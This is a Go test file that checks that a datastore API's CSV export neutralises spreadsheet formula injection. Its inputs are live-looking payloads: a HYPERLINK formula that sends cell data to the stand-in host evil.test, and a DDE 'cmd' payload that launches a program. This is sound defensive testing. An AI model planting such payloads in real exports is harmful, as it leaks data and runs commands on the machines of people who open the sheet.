package api_test

import (
	"encoding/csv"
	"net/http"
	"strings"
	"testing"
)

// The finding's own reproduction, end to end: a value that arrives from
// untrusted input into a datastore and is exported as CSV must not reach Excel
// as a live formula. The export is the trust boundary, so the sheet is where
// the mitigation has to be visible.
func TestExportedDatastoreCellsAreNotLiveFormulas(t *testing.T) {
	handler, _ := newDatastoreAPI(t, "tenant-a")
	created := createDatastore(t, handler, "Inbound")
	requestJSON[map[string]any](t, handler, http.MethodPost, "/api/v1/datastores/"+created.ID+"/columns",
		map[string]any{"name": "note", "type": "string"}, http.StatusOK)

	formulas := []string{
		`=HYPERLINK("http://evil.test/"&A1,"click")`,
		`+cmd|'/C calc'!A0`,
		`@SUM(1+1)`,
	}
	for _, formula := range formulas {
		requestJSON[rowResource](t, handler, http.MethodPost, "/api/v1/datastores/"+created.ID+"/rows",
			map[string]any{"values": map[string]any{"note": formula}}, http.StatusCreated)
	}
	// An ordinary value must come out exactly as it went in, and the row store
	// must still hold the formula text — only the export is neutralised.
	requestJSON[rowResource](t, handler, http.MethodPost, "/api/v1/datastores/"+created.ID+"/rows",
		map[string]any{"values": map[string]any{"note": "a=b"}}, http.StatusCreated)

	recorder := get(t, handler, "/api/v1/datastores/"+created.ID+"/rows/export")
	if recorder.Code != http.StatusOK {
		t.Fatalf("export status = %d, want 200 (body: %s)", recorder.Code, recorder.Body)
	}
	records, err := csv.NewReader(strings.NewReader(recorder.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("the export is not readable CSV: %v", err)
	}
	if len(records) != len(formulas)+2 {
		t.Fatalf("export carried %d records, want a header and %d rows", len(records), len(formulas)+1)
	}

	// Read as a spreadsheet would: every field a person opens the sheet with.
	for _, record := range records[1:] {
		for _, cell := range record {
			if cell == "" {
				continue
			}
			switch cell[0] {
			case '=', '+', '-', '@', '\t', '\r':
				t.Errorf("export carries a live formula cell %q", cell)
			}
		}
	}
	for index, formula := range formulas {
		if got := records[index+1][0]; got != "'"+formula {
			t.Errorf("row %d exported as %q, want the neutralised %q", index, got, "'"+formula)
		}
	}
	if got := records[len(records)-1][0]; got != "a=b" {
		t.Errorf("ordinary value exported as %q, want it unchanged", got)
	}
}
